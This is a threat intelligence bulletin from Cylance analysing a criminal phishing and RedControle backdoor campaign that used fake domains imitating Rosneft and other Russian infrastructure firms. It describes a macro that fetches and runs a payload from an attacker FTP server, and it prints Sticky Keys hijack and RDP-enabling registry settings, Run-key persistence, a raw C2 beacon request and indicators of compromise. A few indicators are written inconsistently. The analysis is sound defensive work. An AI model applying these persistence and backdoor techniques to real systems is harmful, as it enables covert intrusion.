Poking the Bear: Three-Year Campaign Targets Russian
Critical Infrastructure

by Cylance Threat Intelligence Bulletin | December 11, 2018
Nation-state conflict has come to dominate many of the policy discussions and much of
the strategic thinking about cybersecurity. When events of geopolitical significance hit the
papers, researchers look for parallel signs of sub rosa cyber activity carried out by statesponsored threat actors—espionage, sabotage, coercion, information operations—to
complete the picture. After all, behind every story may lurk a cyber campaign.
But ordinary criminals read the newspaper too and are keenly aware of the bias some
researchers bring to the table. Exploiting that bias can provide additional camouflage,
another layer of seeming invisibility, making threat actors harder to detect.
In this Threat Intelligence Bulletin, we’ll show how an investigation into the apparent
targeting of a state-owned Russian oil company led to the uncovering not of a statesponsored campaign but of the bold activity of what we believe to be a criminal effort
motivated by the oldest of incentives—money.

Background
Rosneft calls itself the world’s largest publicly traded oil company, and, according to recent
analysis in the New York Times, it is also a prominent foreign policy tool of the Russian
government. More than half of the company is owned by Moscow and serves as a major
pillar of critical infrastructure for Russia as well as other neighboring nation states.
So when a deal reportedly worth an excess of $10 billion was announced to take nearly 20%
of the company private, news organizations around the world took note.
The deal quickly became the subject of international political intrigue: Who were the
buyers? Why was it sold? Who brokered the deal? Facts that became even more apparent
when the transaction received conspicuous mention in the now-infamous Steele Dossier.
Reporters, business leaders, and international observers also focused scrutiny on Rosneft
in part because the deal was, according to news reports, fraught with delays and setbacks
and came to involve a cast of characters that reportedly included a former Qatari diplomat
turned head of a sovereign wealth fund.
Everything we learned about Rosneft in the last few years—its status as critical
infrastructure, the huge sums of money involved in its privatization, its domestic and
international political significance—made it a highly likely and legitimate target of foreign
espionage efforts.

Indeed, when we at Cylance first saw the name “Rosneft” emerge in our research, we
thought that was exactly what we were looking at: another state or state-sponsored
espionage effort.
But we soon discovered that our initial impressions were flawed.

Evolution of a Threat
In July 2017, Cylance stumbled upon some interesting macros embedded in Word
documents we uncovered in a common malware repository that seemed to be aimed at
Russian-speaking users. We observed the same type of document resurface in the
beginning of 2018 and decided to take a closer look.
Upon closer inspection, we noticed that the malware author meticulously used command
and control (C2) domains which very closely mimicked their real counterparts in the
Russian oil and gas industries, in particular Rosneft and subsidiaries of Rosneft.
As we investigated further, we discovered that the threat actor had created similar sites to
mimic more than two dozen mostly state-owned oil, gas, chemical, agricultural, and other
critical infrastructure organizations, in addition to major Russian financial exchanges.
The first Rosneft-related site we came across was “rnp-rosneft[.]ru” which was designed to
resemble the legitimate webpage “mp-rosneft[.]ru”. The only reference to this domain we
could identify was the email address “sec_hotline@mp-rosneft[.]ru” which was used by
Rosneft for confidentially reporting corporate fraud, corruption, and embezzlement.
After a bit of malware excavation, we discovered that the author had been operating for
more than three years with very few changes to the actual malware used other than his/her
targets. Interestingly, we uncovered evidence that suggests the actor started out targeting
the gaming community, specifically users of Steam, then quickly evolved to more lucrative
endeavors.

Technical Analysis
Phishing Documents Analysis
Cylance researchers identified several phishing documents which used Microsoft Office
macros to deliver malicious implants to their targets. It’s not entirely clear whether these
were specifically targeted at isolated groups or utilized the old spray-and-pray method to
cast a much wider net. Let’s take a look at one:

Figure 1: Macro Contents of Phishing Document
At a high level, this macro will write a number of FTP commands to a text file named “1.txt”
in %APPDATA%. When executed by the last command it will login and download a file from
an ftp server hosted on “rnp-rosneft[.]ru” and save it as “module.exe”. It then starts the
“module.exe” binary and deletes another file named “1.cmd”. The binary “module.exe” was
a modern variant of a family of malware that ESET calls “RedControle.” Cylance identified
several other phishing documents which operated in a similar vein that are listed in the
Appendix.

Malware Analysis
We were able to recover several recent samples associated with phishing attempts
connected to the rnp-rosfnet[.]ru domain as well as some older samples tied to trstorg[.]ru
from July 2017. From what we could gather, “tstorg[.]ru” was originally the website of a

3/14

Russian company called “TechnoSnabTorg” involved in the sale of spare parts for drilling
and road-building equipment; the company specialized in providing parts for Caterpillar,
Komatsu, Volvo, Fiat, and Hitachi equipment.
This sample was first submitted to online virus scanners in July 2017 and detected by only
13 companies at that time:

Filenames:
Актуальный ПРАЙС10.07.2017.exe, ApMsgFwd.exe, SetLogin1Connect.exe
The backdoor was programmed in Delphi and communicates over HTTP to two C2 servers.
It sends information about the IP address, hostname, and attached drives in its initial
communications.
It first attempts to communicate directly to the IP address “91.211.245[.]246” on TCP port
80 and then will attempt to communicate to “83.166.242[.]15” on TCP port 17425.
Keystroke data, clipboard data, as well as window names are communicated in clear text
via HTTP to the 91.211.245[.]246 in near-real time as the victim interacts with their
computer.
The information is collected using a well-known method leveraging the
SetWindowsHookExA API. Commands are received from the other C2 server
“83.166.245[.]15” in what appears to be cleartext; however, the backdoor also has the
ability to communicate over SSL using the Delphi Indy library:

The backdoor installs itself using the good old-fashioned Run key under the infected user’s
registry hive
“HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ApMsgFwd.exe”.
The backdoor had the ability to upload and download files, manipulate files and folders,
compress and decompress files using ZLIB, enumerate drive information and host
information, elevate privileges, capture screenshots and webcam pictures, block and/or
simulate user input, log keystrokes, and manipulate processes on the infected system.
Directives from the C2 were randomly broken up by the character “_” in an attempt to likely
evade HIDS and NIDS signatures such as the command “ST_A_RT_FI_LE”.
Later versions of RedControle used randomized strings broken up by the same “_”
character to further hinder signature-based analysis and reverse engineering efforts. In the
sample Cylance researchers analyzed, the initial connection looked something like this:

Where the string in BLUE was sent by the C2 server and the string in RED was sent by the
victim as an initial check in containing the IP address and a unique victim identifier. The
backdoor operated using a series of threads which were designed to segment different
backdoor functionality into autonomous threads which ran based on different pre-defined
Delphi-based timers.
The backdoor appeared to be a mishmash of different authorship with the keylogger
portion containing Portuguese language strings and other functions related to process
manipulation containing references to Slavic language strings. These strings were
eventually removed or obfuscated in later versions.

The Dropper
Cylance identified an executable dropper:
b65125ee14f2bf12a58f67c623943658dd457e5b40b354da0975d7615fe9d932
The dropper planted a version of RedControle on the system as well as another interesting
binary while showing the potential victim a nice picture of a holiday present. The dropper
was relatively uninteresting; however, a Sticky Keys backdoor would also be placed on the
system, which warranted additional analysis.

6e476a2ef02986a13274fb2a126ed60a1ede252919d6993de03622aaa7fe6228
The dropper created two executable files within the folder
“%ALLUSERSPROFILE%\Documents”, “svhost.exe” and “system.exe” and created two
associated Run keys to maintain persistence for both executables. The program
“svhost.exe” was the aforementioned RedControle variant with network callbacks to the
domain “trstorg[.]ru” and the IP address “83.166.243[.]48”.
The “system.exe” file was a StickyKeys backdoor programmed in Delphi. It first opened
TCP port 3389 in the Windows Firewall and then set the following Registry Keys:
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution
Options\sethc.exe\Debugger -> C:\WINDOWS\system32\taskmgr.exe
HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections ->
null value
The file was primarily responsible for enabling RDP on the target system and performing a
sticky keys hijack to point to the legitimate “taskmgr.exe” binary.
If our readers are unfamiliar with StickyKeys, it was originally designed for people who
have difficulty holding down two or more keys simultaneously. StickyKeys can be enabled
on Windows by rapidly pressing the shift key five times. The registry key above will
simultaneously launch the Task Manager binary “taskmgr.exe” along with the intended
StickyKeys binary. The StickyKeys backdoor can then test corresponded to “google.ru” and
various subdomains. If the test is successful, it will make the following HTTP request to
“trstorg[.]ru” on TCP port 80:
GET /bas.php HTTP/1.1
User-Agent: DMFR
Host: trstorg.ru
Cache-Control: no-cache

This particular sample will no longer work as the IP address “80.254.96[.]251” appeared to
have been reassigned to another party and no longer operates a webserver.

Open Source Intelligence Analysis
The RedControle backdoors frequently created the unique mutex

“AppFilQsSSSwwww_jadknskjnd_jadknskjnd”
which directly links the above samples to the following hashes through open source
intelligence:

Several of these samples communicated to the domains “sxe-csgo[.]net” and
“h84622.s05.test-hf[.]su”.
These domains led to two primary IP addresses: “91.227.16[.]115” and “91.227.16[.]6” as
well as a few hundred unique file hashes.
The IP addresses “109.68.190[.]244” and “46.38.50[.]106” which resolved to “sxecsgo[.]net” in 2015 and 2016 let Cylance definitively tie this subset of activity to activity
targeting the Russian Steam community as well as the Counterstrike and CS:Go
communities previously documented here, here, and here.

Infrastructure Analysis
The threat actor left bits of infrastructure open over time and Cylance was able to harvest
some of the server-side scripts utilized by the malware for tracking and recording data
stolen from intended victims. Additionally, the attacker utilized Cloudflare for free bulk SSL
certificates, which inadvertently exposed a number of domains.
The attacker put a lot of time and effort into closely imitating legitimate domains and
continually altered their targets over time. They would also occasionally register legitimate
domains after the domains had expired.
The actor relied heavily upon the Lithuanian provider “vpsnet[.]lt” likely as a result of the low
cost overhead of a couple euros per month per virtual private server (VPS).

Conclusions
When we first discovered that the threat actor was using more than two dozen websites to
mimic real Russian critical infrastructure companies, we were intrigued. The effort required
to set up those domains seemed disproportionate to the perceived benefit of using them
simply as command-and-control infrastructure.

7/14

Then we saw a paid contributor article in a Russian edition of Forbes, published in April
2017 and entitled (in Google’s translation to English) Attack of the Clones: How Schemes
Work with Fake Sites of Rosneft and Other Large Companies.
The author was Ilya Sachkov, the founder and CEO of infosec company Group-IB and a
member of cybercrime expert committees in the Council of Europe and the OSCE.
The article described what appeared to be unpublished Group-IB research findings into an
elaborate criminal scheme wherein a threat actor was creating near-clones of legitimate
Russian critical infrastructure companies—Rosneft most prominent among them—in order
to harvest credentials and perpetuate fraud.
In the article, Sachkov provided screen shots of many of the mimicked sites to establish
just how painstakingly close to the original these fake sites were designed to look.
The article referenced several of the companies and websites by name, which Group-IB said
were part of the fraud campaign. At least one of the affected companies was described in
the article as being a client of Group-IB.
That company’s domain, as well as nearly all of the other domains cited by Group-IB were
also uncovered in the Cylance investigation. For example, in addition to Rosneft, they
included: Mendeleevkazot, HCSDS, and EuroChem. Mendeleevkazot is a fertilizer
manufacturer and part of a larger Russian critical infrastructure holding company. HCSDS
is an acronym for a Siberian Business Union, a holding company comprised of several
Russian critical infrastructure companies. EuroChem (Group-IB’s apparent client) is a
Swiss-based fertilizer company with its primary mining activity in Russia. Its name came up
in several news-related searches indicating its involvement in large financial transactions
as well as geopolitical maneuvering.
Given the overlap in findings and the direct connection to past criminal campaigns
targeting the gaming community, it seemed clear we were looking at the same operation—a
criminal operation, not nation-state espionage activity.
The line between well-organized criminal efforts and nation-state activity can often be
blurry, but practitioners and consumers of threat intelligence should beware of inherent
biases. As we have shown in this Bulletin, what appears at first blush to be a clear indicator
of nation-state malfeasance may in fact simply allow a criminal to hack your way of
thinking shortly before hacking your organization.
